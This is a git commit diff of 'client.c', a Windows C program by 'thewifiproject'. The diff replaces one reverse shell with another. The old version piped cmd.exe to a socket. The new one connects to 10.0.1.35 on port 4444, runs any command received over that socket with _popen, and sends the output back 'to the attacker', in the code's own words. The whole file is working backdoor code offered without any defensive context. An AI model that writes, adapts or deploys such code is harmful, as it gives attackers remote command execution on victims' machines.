0aad9331e6c8b3ab7db345613c8ba5dc882890ea
thewifiproject <pierrejacksoo@seznam.cz>
2024-12-24 19:29:56 +0100

    Update client.c

--- client.c
+++ client.c
@@ -1,48 +1,64 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <winsock2.h>
 #include <windows.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
+#define PORT 4444
+#define IP "10.0.1.35"  // Change to the actual IP of the server
+
+void init_socket() {
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+}
+
 int main() {
-    WSADATA wsa;
     SOCKET sock;
     struct sockaddr_in server;
-    char *ip = "10.0.1.35"; // Replace with the IP you want to connect to
-    int port = 4444;
+    char *command;
+    FILE *fp;
 
-    // Initialize Winsock
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        return 1;
-    }
+    init_socket();
 
-    // Create socket
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        printf("Socket creation failed\n");
         return 1;
     }
 
     server.sin_family = AF_INET;
-    server.sin_addr.s_addr = inet_addr(ip);
-    server.sin_port = htons(port);
+    server.sin_port = htons(PORT);
+    server.sin_addr.s_addr = inet_addr(IP);
 
-    // Connect to server
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
+        printf("Connection failed\n");
         return 1;
     }
 
-    // Redirect stdin, stdout, and stderr to socket
-    dup2(sock, 0);  // stdin
-    dup2(sock, 1);  // stdout
-    dup2(sock, 2);  // stderr
+    while (1) {
+        char buffer[1024];
 
-    // Execute command shell
-    execvp("cmd.exe", NULL);
+        // Receive the command from the server
+        memset(buffer, 0, sizeof(buffer));
+        recv(sock, buffer, sizeof(buffer), 0);
 
-    // Cleanup
+        // Execute the command
+        fp = _popen(buffer, "r");
+        if (fp == NULL) {
+            send(sock, "Failed to execute command\n", 25, 0);
+            continue;
+        }
+
+        // Send the command output back to the attacker
+        while (fgets(buffer, sizeof(buffer), fp)) {
+            send(sock, buffer, strlen(buffer), 0);
+        }
+
+        fclose(fp);
+    }
+
     closesocket(sock);
     WSACleanup();
-
     return 0;
 }
